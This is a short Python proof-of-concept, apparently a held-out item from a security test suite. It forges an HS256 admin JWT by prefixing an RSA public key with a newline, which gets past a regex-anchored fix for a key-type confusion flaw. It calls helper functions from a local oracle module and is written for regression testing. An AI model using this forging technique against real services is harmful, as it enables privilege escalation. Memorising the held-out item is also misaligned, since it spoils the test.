#!/usr/bin/env python3
"""[HELD-OUT] CVE-2026-34950 residual: whitespace-prefixed RSA public key algorithm confusion.

The V1 fix (regex /^-----BEGIN( RSA)? PUBLIC KEY-----/, commit 15a6e92) is ^-anchored and does
NOT .trim() the public-key path. A verifier configured with a public key that has a LEADING
newline (GHSA-mvf2-f6gm-w987: "'\\n' + publicKeyPem", a database-retrieved key) fails the ^ match
-> the RSA public key is misclassified as an HMAC secret -> an HS256 token signed with that exact
key string (whitespace included) verifies as an admin token. V2 (6.2.0) trims first -> blocked.
"""
from __future__ import annotations

import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from oracle import fetch_pubkey, forge_hs256, _admin  # noqa: E402


def bypass_poc(version: str = "v1"):
    pub = fetch_pubkey(version)
    secret = ("\n" + pub).encode("utf-8")  # LEADING newline defeats the ^ anchor on V1
    token = forge_hs256(secret, {"sub": "attacker", "role": "admin"})
    return _admin(version, "admin-tainted", token)
